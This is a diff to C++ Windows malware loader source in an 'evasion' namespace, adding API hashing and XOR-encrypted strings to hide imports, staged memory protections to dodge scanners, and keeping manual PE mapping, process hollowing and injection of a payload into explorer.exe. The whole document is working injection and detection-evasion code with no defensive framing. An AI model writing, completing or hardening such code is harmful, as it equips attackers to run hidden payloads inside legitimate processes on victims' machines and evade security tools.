@@ -1,6 +1,7 @@
 #include "Injector.h"
 #include "../utils/Logger.h"
 #include "../utils/Obfuscator.h"
+#include "../utils/ApiHasher.h"
 #include <tlhelp32.h>
 #include <algorithm>
 #include <cwctype>
@@ -8,44 +9,44 @@
 namespace evasion {
 
 namespace {
+    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
+    typedef BOOL(WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+    typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+
     struct RELOC_ENTRY {
         WORD Offset : 12;
         WORD Type : 4;
     };
 }
 
-bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload) {
+bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID pParam) {
+    (void)pParam;
+    auto fVirtualAllocEx = utils::GetProcAddressH<pVirtualAllocEx>("kernel32.dll", H_VirtualAllocEx);
+    auto fWriteProcessMemory = utils::GetProcAddressH<pWriteProcessMemory>("kernel32.dll", H_WriteProcessMemory);
+    auto fVirtualProtectEx = utils::GetProcAddressH<pVirtualProtectEx>("kernel32.dll", H_VirtualProtectEx);
+    auto fCreateRemoteThread = utils::GetProcAddressH<pCreateRemoteThread>("kernel32.dll", H_CreateRemoteThread);
+
+    if (!fVirtualAllocEx || !fWriteProcessMemory || !fVirtualProtectEx || !fCreateRemoteThread) return false;
+
     PBYTE pSrcData = (PBYTE)payload.data();
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
 
-    // 1. Allocate memory in target process
-    PBYTE pTargetBase = (PBYTE)VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // 1. Allocate as READWRITE (not EXECUTE yet)
+    PBYTE pTargetBase = (PBYTE)fVirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pTargetBase) return false;
 
-    // 2. Map headers
-    if (!WriteProcessMemory(hProcess, pTargetBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) return false;
-
-    // 3. Map sections
-    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
-    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
-        if (pSectionHeader[i].SizeOfRawData == 0) continue;
-        if (!WriteProcessMemory(hProcess, pTargetBase + pSectionHeader[i].VirtualAddress, pSrcData + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData, NULL)) return false;
-    }
-
-    // 4. Handle Relocations (locally first, then write fixed sections)
-    // Actually, it's easier to fix relocations in a local buffer and then write to target
+    // 2. Map locally and fix relocs
     std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
     PBYTE pLocalBase = localMapping.data();
-
-    // Copy everything to local buffer first
     memcpy(pLocalBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders);
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
     for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
         if (pSectionHeader[i].SizeOfRawData == 0) continue;
         memcpy(pLocalBase + pSectionHeader[i].VirtualAddress, pSrcData + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);
     }
 
-    // Fix relocations in local buffer
     DWORD_PTR delta = (DWORD_PTR)pTargetBase - pNtHeaders->OptionalHeader.ImageBase;
     if (delta != 0) {
         auto& relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
@@ -68,11 +69,15 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         }
     }
 
-    // Write fixed image to target
-    if (!WriteProcessMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL)) return false;
+    // 3. Write fixed image to target
+    if (!fWriteProcessMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL)) return false;
 
-    // 5. Start thread at Entry Point
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL);
+    // 4. Change protections to EXECUTE_READ
+    DWORD oldProtect;
+    if (!fVirtualProtectEx(hProcess, pTargetBase, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &oldProtect)) return false;
+
+    // 5. Execution (using CreateRemoteThread for now but with better protections)
+    HANDLE hThread = fCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL);
     if (!hThread) return false;
 
     CloseHandle(hThread);
@@ -83,7 +88,6 @@ bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<u
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     RtlZeroMemory(&si, sizeof(si));
-    RtlZeroMemory(&pi, sizeof(pi));
     si.cb = sizeof(si);
 
     if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
@@ -97,7 +101,9 @@ bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<u
         return false;
     }
 
-    ResumeThread(pi.hThread);
+    auto fResumeThread = utils::GetProcAddressH<decltype(&ResumeThread)>("kernel32.dll", H_ResumeThread);
+    if (fResumeThread) fResumeThread(pi.hThread);
+
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     return true;
@@ -123,12 +129,16 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
     return pid;
 }
 
-bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload) {
+bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
+    (void)dropperPath;
     // "explorer.exe"
     DWORD pid = GetProcessIdByName(utils::DecryptW(L"\x3f\x22\x2a\x36\x35\x28\x3f\x22\x54\x31\x2c\x31"));
     if (pid == 0) return false;
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    auto fOpenProcess = utils::GetProcAddressH<decltype(&OpenProcess)>("kernel32.dll", H_OpenProcess);
+    if (!fOpenProcess) return false;
+
+    HANDLE hProcess = fOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return false;
 
     bool success = MapAndInject(hProcess, payload);
